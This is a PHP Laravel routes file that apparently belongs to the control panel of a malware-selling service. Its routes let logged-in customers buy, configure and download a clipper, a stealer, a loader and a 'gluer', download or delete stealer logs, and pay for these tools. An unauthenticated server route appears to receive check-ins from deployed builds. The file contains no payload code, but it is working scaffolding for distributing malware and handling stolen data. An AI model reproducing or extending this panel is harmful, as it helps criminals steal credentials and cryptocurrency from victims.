<?php

Route::get('/', function () {
    return view('auth.register');
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
Route::get('/404', 'ErrorController@index')->middleware('auth');

Route::get('/clipper', 'ClipperController@index')->middleware('auth');
Route::get('/settings', 'ClipperController@settings')->middleware('auth');
Route::get('/dowloadclipper', 'ClipperController@dowloadClipper')->middleware('auth');
Route::post('/addSettings', 'ClipperController@addSettings')->middleware('auth');
Route::get('/server/{server}/{id}/{soft}', 'ClipperController@server');

Route::get('/main', 'MainController@index')->middleware('auth');
Route::get('/gluer', 'MainController@gluer')->middleware('auth');
Route::post('/buygluer', 'MainController@buyGluer')->middleware('auth');
Route::get('/piar', 'MainController@piar')->middleware('auth');
Route::post('/buypiar', 'MainController@buyPiar')->middleware('auth');
Route::get('/buyclipper', 'MainController@buyClipper')->middleware('auth');
Route::get('/buystealer', 'MainController@buyStealer')->middleware('auth');


Route::get('/payment', 'PaymentsController@index')->middleware('auth');
Route::get('/success', 'PaymentsController@success');
Route::post('/payments', 'PaymentsController@payments');

Route::get('/profile', 'ProfileController@index')->middleware('auth');
Route::post('/editprofile', 'ProfileController@editProfile')->middleware('auth');
Route::post('/addpromo', 'ProfileController@addPromo')->middleware('auth');
Route::post('/activate', 'ProfileController@activate')->middleware('auth');

Route::get('/stealer', 'StealerController@index')->middleware('auth');
Route::get('/downloadlogs', 'StealerController@downloadLogs')->middleware('auth');
Route::get('/deletelogs', 'StealerController@deleteLogs')->middleware('auth');

Route::get('/freeloader', 'LoaderController@index')->middleware('auth');
Route::post('/downloadtask', 'LoaderController@dowloaderTask')->middleware('auth');
Route::get('/dowloadloader', 'LoaderController@dowloadLoader')->middleware('auth');
